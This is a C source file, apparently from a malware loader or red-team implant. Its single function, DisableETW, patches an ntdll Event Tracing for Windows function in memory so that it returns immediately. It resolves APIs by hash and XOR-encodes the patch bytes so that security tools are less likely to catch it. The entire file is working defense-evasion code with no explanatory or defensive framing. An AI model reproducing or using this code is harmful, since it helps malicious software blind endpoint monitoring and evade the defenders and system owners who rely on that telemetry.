#include "etw.h"
#include "typedefs.h"
#include "xor.h"
#include "custom_loaderapi.h"
#include "indirect_syscall.h"
#include "helper_functions.h"
#include "debug.h"

// Todo: 
// Needs to be converted to use indirect syscalls
//
BOOL DisableETW(DWORD64 EtwFunctionHash) {

#ifdef DEBUG
	PRINTA("\n\
<><><><><><><><><><><><		STARTING ETW DISABLER	><><><><><><><><><><><><>\n");
#endif

	BOOL res = FALSE;
	DWORD dwOld = 0;

	// xor eax, eax 
	// ret
	/*
	BYTE patch[] = {
		0x31, 0xc0,
		0xc3
	};
	*/

	unsigned char _key = 0x86;
	BYTE xpatch[] = {
		0xb7, 0x46, 0x45
	};

	SIZE_T patchSize = sizeof(xpatch);

	t_VirtualProtect VirtualProtect = (t_VirtualProtect)_GetProcAddress(_GetModuleHandle(KERNEL32_HASH), VIRTUALPROTECT_HASH);
	t_GetLastError GetLastError = (t_GetLastError)_GetProcAddress(_GetModuleHandle(KERNEL32_HASH), GETLASTERROR_HASH);
	if (VirtualProtect == NULL ||
		GetLastError == NULL) {
		return FALSE;
	}

	PBYTE pEtw = (PBYTE)_GetProcAddress(_GetModuleHandle(NTDLL_HASH), EtwFunctionHash);
	if (pEtw == NULL) {
		return FALSE;
	}

	if (VirtualProtect(pEtw, patchSize, PAGE_READWRITE, &dwOld) == 0) {
#ifdef DEBUG
		PRINTA("[!] Failed changing protection -> RW (%d) !\n", GetLastError());
#endif
		return FALSE;
	}
	else {

#ifdef DEBUG
		PRINTA("[+] Successfully changed protection -> RW !\n");
#endif
	}

	ZwMoveMemory(pEtw, xpatch, patchSize);
	XORA(pEtw, _key, patchSize);

#ifdef DEBUG
	PRINTA("[+] ETW Patch applied successfully\n");
#endif
	
	if (VirtualProtect(pEtw, patchSize, dwOld, &dwOld) == 0) {
#ifdef DEBUG
		PRINTA("[!] Failed to restore protection (%d) !\n", GetLastError());
#endif
		return FALSE;
	}
	else {
		res = TRUE;
#ifdef DEBUG
		PRINTA("[+] Successfully restored protection !\n");
#endif
	}

	if (res != FALSE) {
		return TRUE;
	}
	else {
		return FALSE;
	}
}
